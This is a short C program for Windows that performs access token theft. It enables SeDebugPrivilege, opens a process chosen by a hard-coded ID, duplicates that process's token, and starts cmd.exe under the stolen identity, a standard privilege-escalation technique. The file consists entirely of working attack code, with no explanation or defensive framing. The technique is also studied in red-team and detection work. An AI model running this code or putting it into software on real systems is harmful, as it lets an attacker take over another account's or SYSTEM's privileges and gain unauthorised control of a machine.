#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

void EnablePrivileges(HANDLE hToken, LPCSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	LookupPrivilegeValue(NULL, lpszPrivilege, &luid);

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL );

	    
}

int main()
{
	int pid_to_impersonate = 1124;
	HANDLE TokenHandle = NULL;
	HANDLE DuplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	HANDLE CurrentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(),  TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle );
	
	EnablePrivileges(CurrentTokenHandle, SE_DEBUG_NAME, TRUE);

	HANDLE rProc;
	rProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid_to_impersonate);

	BOOL rToken = OpenProcessToken(rProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);
	BOOL impersonateUser = ImpersonateLoggedOnUser(TokenHandle);

	DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateTokenHandle);

	CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);

	return 0;


}